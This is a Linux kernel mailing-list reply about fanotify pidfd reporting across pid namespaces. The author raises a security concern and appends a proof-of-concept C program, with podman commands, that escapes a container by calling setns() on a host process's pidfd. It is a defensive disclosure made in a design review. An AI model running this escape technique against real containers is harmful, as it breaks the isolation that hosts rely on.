Received: from mail-dy1-f195.google.com (mail-dy1-f195.google.com [74.125.82.195])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9BA548F7D
	for <linux-fsdevel@vger.kernel.org>; Sat,  6 Jun 2026 23:45:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.195
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780789540; cv=none; b=l4yCB59amacPgbSlpbQCyR/daIdtjiD0df+p0kgvFmPTlj1PU/bOtwulPQ/06WiUWGGXBzg3/JcgFPoDhrDItsB5otuSLs848/2lqhsyV+0G/DbjBHk0hdzVDhknJOG5Vf+m5oWGyqn5O1xvj4bNVRJYK45fvLYG4H+mI9tTrLM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780789540; c=relaxed/simple;
	bh=G4YZOrcabSOrkJNhFlutXbGIsvCJ/hqhXX4rWTFYyQI=;
	h=MIME-Version:Content-Type:Subject:From:To:Cc:In-Reply-To:
	 References:Date:Message-Id; b=aBfz3rYfCZw5M6cocrfSFZV4uxXJaW9aRn7pi3yxWo/s9pmJyHL65OsvuBiWrY3anRMy1Af1XIfivnryo2hT+yF6RvTybinacYji2hetv7WS1l72oS9LXrIwkN6RCeLk6++O3EeqTMaZD5/v/EmcP93blBWq1owFfQe8N0vDyfA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=FuOAImHw; arc=none smtp.client-ip=74.125.82.195
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="FuOAImHw"
Received: by mail-dy1-f195.google.com with SMTP id 5a478bee46e88-304cf518c9dso3913114eec.1
        for <linux-fsdevel@vger.kernel.org>; Sat, 06 Jun 2026 16:45:38 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1780789538; x=1781394338; darn=vger.kernel.org;
        h=message-id:date:references:in-reply-to:cc:to:from:subject
         :content-transfer-encoding:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=BLjL7+D0ycBm00UEjNAqeKyeq7fIjQIPizeWixfZ1vk=;
        b=FuOAImHwR54YAsnS0a67iM9mfFyqcw9uKsCO1NkWa4Mk7wUhLpmtw/f9ufE7GCrPpF
         pzHZrc05jTissw8RldILWwp8J/sMeJvGfpKvdcLWUqd6GsiNMavHZBjAfEapU19zSgVG
         LNVjHrLSaeVZYenBQ4w6YiLHjhCIwUHCwlmWAguC8qeTXY/nrNKHrk6PCU5tNL8+48T0
         7z0XkC93RQQLr3oYc3zv681LxHtEm050oAi9HdfMrIj7vKO32TCPL/fX8Tq/UOH3fZNh
         bn5Tk9huPDqFdTAs5nYOy35A3sgJJTPCOUBjzSiWQaUVY0+ywxTe9J85fZWFwMXCXkO7
         24GA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780789538; x=1781394338;
        h=message-id:date:references:in-reply-to:cc:to:from:subject
         :content-transfer-encoding:mime-version:x-gm-gg:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=BLjL7+D0ycBm00UEjNAqeKyeq7fIjQIPizeWixfZ1vk=;
        b=GOnxr8tOd5a5Jn5k6f9hdKWNcxeZZ2OpKWkceNGdw8n5dkBjOI/pmzp0/GvHhbt+z7
         LbhOnROSj4EneBWXqS8hTJKGwKGOLR9k3Rv9GbauBf5+kzwbICIhxlegx7PEGzKT7dUM
         5+SUyKcI0XnSvMdzPrCyMYrerEtUFb+0pOwFxA9JUiDXEe+ymZ9Jd9yeEx8M0yxCMuOC
         pl26TmSJRBvsDaLfE6aX+hGBWl38FbmwLY//5WerBESPwirrJkJv2G22A9kL3htKPGML
         4WKD9XYtLlWWDsKSFOpa1Zkjm2G2AGY74gdzF1/8BWtP5Vv73P6JC2PZMfZ/oc6pX/zI
         T3RA==
X-Forwarded-Encrypted: i=1; AFNElJ/3W9EKvkvcUnpcC0PF2qsHu+fNi1leG84VEPByDDQccI54AhtmbEs/RFUO0Sln0RfCw10Nd/cCX+slcHaR@vger.kernel.org
X-Gm-Message-State: AOJu0YyP2oq1w+/nxABu/KsUlR3j83H7FbCGUm79Qq0+XWIv/wr/vqRN
	hot77XYse+t3ABZa6v+gpOlSWQFBicyxhImyQT3J5YIW/hFcVRK+wt8J
X-Gm-Gg: Acq92OH8NZgNPRRGtSeqjgjGD0zp70uSCA2ydK+sTf7PTHUMu/M65+jQfkxQpxUDgqV
	yTj8n9iT6IKXKeN+sK748au6vNSJkI4FFqu18kfw1siM8PPNHeDlM7ApkHKx7XmrLqZqqBiTKzV
	drCQWc3Rq4EhS2a4UQcHw2kgxYHB+PdotcAC62OXO/tgHPxLNAWyPCgBmiZ3TY0ZXChz732AAvI
	U3cyDqkRC5PvmwrB6ewRDhZe3jB/CyZgBJ9knQfdjJXAeG7+RGYpaGp9heMGnMHE/kaBxDo+VzZ
	kem/beQ7B4IIQ85ECe97eNtaB6rkDdOI/fWLj2QPOxcVnkzkUb77tVHHrGhcRQNSHT435IwSqwJ
	hOmm7s97BEXcSA/zPnJh4+ufsqv6YUwvuLiS021QDaPZEYXXA/9aaT84dV396wI6CuSHYiZ5RQ9
	Lm1Ud92n992wLBAoNFTj5ESoSN81ORs/in43u+/Gk=
X-Received: by 2002:a05:7300:5710:b0:307:34f9:cc9 with SMTP id 5a478bee46e88-3077ae88144mr5207158eec.2.1780789537476;
        Sat, 06 Jun 2026 16:45:37 -0700 (PDT)
Received: from [10.61.22.100] ([2605:52c0:2:2f27:be24:11ff:fe89:6f0f])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3074dcad34esm17273830eec.11.2026.06.06.16.45.35
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 06 Jun 2026 16:45:37 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit
Subject: Re: [PATCH v4 2/2] fanotify: allow reporting pidfds for reaped
 tasks
From: AnonymeMeow <anonymemeow@gmail.com>
To: Christian Brauner <brauner@kernel.org>
Cc: AnonymeMeow <anonymemeow@gmail.com>, 
 Amir Goldstein <amir73il@gmail.com>, jack@suse.cz, 
 linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org
In-Reply-To: <20260605-inwiefern-flugbereit-reintreten-9ff8d18b642d@brauner>
References: <20260603001516.26234-3-anonymemeow@gmail.com>
 <20260603031117.20950-1-anonymemeow@gmail.com>
 <CAOQ4uxgudh_W2Gcs5qqGce8yO6503yjrGzEwbjTKkT+DLAqufA@mail.gmail.com>
 <20260603-schindel-drehzahl-planlos-e334e6899cd5@brauner>
 <CAOQ4uxgEnD6aN4HTh14=SPzU25_2xOXxfnY+60udOqNp3nnm4w@mail.gmail.com>
 <20260603-mehrsprachig-altlasten-unverantwortlich-4fcd029306b0@brauner>
 <178060498710.12657.15047020114378440191.b4-reply@b4>
 <20260605-inwiefern-flugbereit-reintreten-9ff8d18b642d@brauner>
Date: Sun, 07 Jun 2026 07:45:21 +0800
Message-Id: <178078952175.93110.16695082677701348131.b4-reply@b4>
X-Mailer: b4 0.15.2
X-Developer-Signature: v=1; a=openpgp-sha256; l=7738; i=anonymemeow@gmail.com;
 h=from:subject:message-id; bh=G4YZOrcabSOrkJNhFlutXbGIsvCJ/hqhXX4rWTFYyQI=;
 b=owGbwMvMwCWmOm1nep3jlf+Mp9WSGLJUNgp76i88aud33/R3lK7bDdNWj5xoPvOlDybcCNCsd
 3nTGb+zo5SFQYyLQVZMkeWNo4D2o88b7xS8f88PM4eVCWQIAxenAEzkfjojQ4tVY/Zeqe/FGyfH
 sPAxOjdO0pM/lnu0L/Hi6dkn5kxxuMXwP/m/TEVWdmqHXUvH+8uPbXIrM3a8mXzhA8vV5sfnxS9
 VsQEA
X-Developer-Key: i=anonymemeow@gmail.com; a=openpgp;
 fpr=EC41102BE2F3B1DC70EFEF0F2596B9677E41D4FF

On 2026-06-05 09:54 +0200, Christian Brauner wrote:
> On Fri, Jun 05, 2026 at 04:29:47AM +0800, AnonymeMeow wrote:
> > On 2026-06-03 13:25 +0200, Christian Brauner wrote:
> > > On Wed, Jun 03, 2026 at 12:58:09PM +0200, Amir Goldstein wrote:
> > > > On Wed, Jun 3, 2026 at 12:28 PM Christian Brauner <brauner@kernel.org> wrote:
> > > > >
> > > > > On Wed, Jun 03, 2026 at 12:00:42PM +0200, Amir Goldstein wrote:
> > > > > > On Wed, Jun 3, 2026 at 5:11 AM AnonymeMeow <anonymemeow@gmail.com> wrote:
> > > > > > >
> > > > > > > Sashiko said that pidfs_register_pid() can fail under memory pressure,
> > > > > > > since it allocates memory using GFP_KERNEL without a way to pass in
> > > > > > > __GFP_NOFAIL. This can cause fanotify_alloc_event() to silently drop
> > > > > > > the event even when the group has an unlimited queue length.
> > > > > > >
> > > > > > > Should we make pidfs registration best-effort instead and still return
> > > > > > > the allocated event if pidfs_register_pid() fails? But IMO this will
> > > > > > > make the API semantically ambiguous. If the kernel guarantees that the
> > > > > > > event pid is registered with pidfs when pidfd reporting is requested,
> > > > > > > then a later FAN_NOPIDFD or -ESRCH can only be caused by the task being
> > > > > > > invisible within the reader's pid namespace. But if we allow best-effort
> > > > > > > registration, the event may still carry a pinned struct pid, but pidfs
> > > > > > > registration may have failed due to memory pressure. If userspace reads
> > > > > > > the event after the task has been reaped, it still gets a FAN_NOPIDFD
> > > > > > > or -ESRCH due to failed pidfs registration caused by memory pressure,
> > > > > > > IMO this should be reported as a -ENOMEM instead of -ESRCH. But
> > > > > > > currently it seems we don't have a good way to register the pid with
> > > > > > > __GFP_NOFAIL or __GFP_RETRY_MAYFAIL, so what would be the preferred
> > > > > > > approach to handle this situation?
> > > > > >
> > > > > > Thanks for noticing the oddity and explaining the options.
> > > > > >
> > > > > > We could fail the event in case on ENOMEM because the system
> > > > > > is likely is a bad shape anyway and other events are likely to fail
> > > > > > allocation themselves, so I am not objecting to your patch as is,
> > > > > >
> > > > > > but I am slightly leaning towards the semantically ambiguous API.
> > > > >
> > > > > As usual, I think a semantically ambiguous api should be avoided.
> > > > >
> > > > > > I don't think that we are going to change the man page to say that
> > > > > > FAN_REPORT_PIDFD is guaranteed to return a pidfd, maybe we just
> > > > > > add a NOTE about increased likelihood of getting a pidfd since kernel XXX
> > > > > > and mention the known cases of pid namespace and ENOMEM.
> > > > >
> > > > > The pid namespace shouldn't matter.
> > > > 
> > > > DO you mean that the event reader inside a pidns always gets a pidfd but
> > > > it will not be able to query the pid of the process outside the pidns
> > > > or do you mean something else?
> > > 
> > > So they will always get a pidfd since fanotify is correctly using
> > > pidfd_prepare() directly. But when the reader tries to resolve the pidfd
> > > to say a pid or retrieve info via the pidfd info ioctl they would fail
> > > to do so (well, the pid will resolve to 0 which is the global indicator
> > > for "can't be resolved in your pidns").
> > > 
> > 
> > Before pidfd_prepare(), fanotify checks whether metadata.pid is
> > non-zero, i.e. whether the event pid is visible in the reader's pidns.
> > If it's not visible, fanotify will not create a valid pidfd and return a
> > FAN_NOPIDFD. This is the existing behavior, and my patches do not change
> > it.
> 
> We can hand that out. That's another change we should consider. The
> pidfd works even if the pid namespace is outside the caller's hierarchy.
> 

I may be missing something, but I am concerned that lifting this
restriction could have security implications... Because it could weaken
the isolation provided by pidns. In the usual case, a task inside a
pidns cannot actively obtain a reference to tasks outside of that ns. If
fanotify is allowed to hand out pidfds across pidns boundaries, a task
inside the ns may be able to obtain access to resources that were
supposed to be isolated from it, such as other tasks' namespaces.

One possible attack surface I can think of is container escape. I wrote
a small toy PoC which escapes from a podman container using this
mechanism. Admittedly, the PoC requires sudo as well as SYS_ADMIN and
SYS_PTRACE caps, so it is not practical by itself. However, I am worried
that in other circumstances this could become a real attack surface.

I'm no expert in this area, so I do not think I am in a good position to
make that call myself... For now, I'm not planning to include removal of
this restriction in my patch set.

With Best Regards,
Anonymemeow

---

PoC code:

// toy.c

#define _GNU_SOURCE

#include <sys/fanotify.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/pidfd.h>
#include <sched.h>

int main()
{
    int fanotify_fd = fanotify_init(FAN_REPORT_PIDFD, 0);
    if (fanotify_fd < 0) {
        perror("fanotify_init");
        exit(1);
    }

    int ret = fanotify_mark(fanotify_fd, FAN_MARK_ADD | FAN_MARK_FILESYSTEM, FAN_ACCESS, 0, "/etc/resolv.conf");
    if (ret < 0) {
        perror("fanotify_mark");
        exit(1);
    }

    for (;;) {
        char buffer[65536];
        int len = read(fanotify_fd, buffer, sizeof(buffer));
        if (len < 0) {
            perror("read");
            break;
        }

        struct fanotify_event_metadata *metadata = (struct fanotify_event_metadata*)buffer;

        while (FAN_EVENT_OK(metadata, len)) {
            unsigned int offset = metadata->metadata_len;

            while (offset < metadata->event_len) {
                struct fanotify_event_info_header *info_hdr = (struct fanotify_event_info_header*)((char*)metadata + offset);

                if (info_hdr->info_type == FAN_EVENT_INFO_TYPE_PIDFD) {
                    struct fanotify_event_info_pidfd *pidfd_info = (struct fanotify_event_info_pidfd*)info_hdr;

                    if (setns(pidfd_info->pidfd,
                        CLONE_NEWNS |
                        CLONE_NEWCGROUP |
                        CLONE_NEWUTS |
                        CLONE_NEWIPC |
                        CLONE_NEWNET
                    )) {
                        perror("setns");
                        exit(1);
                    }

                    int mntinfo_fd = open("/proc/self/mountinfo", O_RDONLY);

                    len = read(mntinfo_fd, buffer, sizeof(buffer));
                    if (len < 0) {
                        perror("read");
                        exit(1);
                    }

                    printf("%s\n", buffer);

                    exit(0);
                }

            offset += info_hdr->len;
            }

            close(metadata->fd);

            metadata = FAN_EVENT_NEXT(metadata, len);
        }
    }

    close(fanotify_fd);
    return 0;
}

# gcc toy.c -o toy
# sudo podman run --rm --cap-add SYS_ADMIN,SYS_PTRACE -v ./toy:/root/toy debian:latest /root/toy

This PoC marks the fs backing the bind-mounted /etc/resolv.conf, which
in this setup is the host /run mount. This means when a process in the
host mntns accesses a file under /run, the program gets a chance to
receive its pidfd and call setns() on it, accomplishing the container
escape.

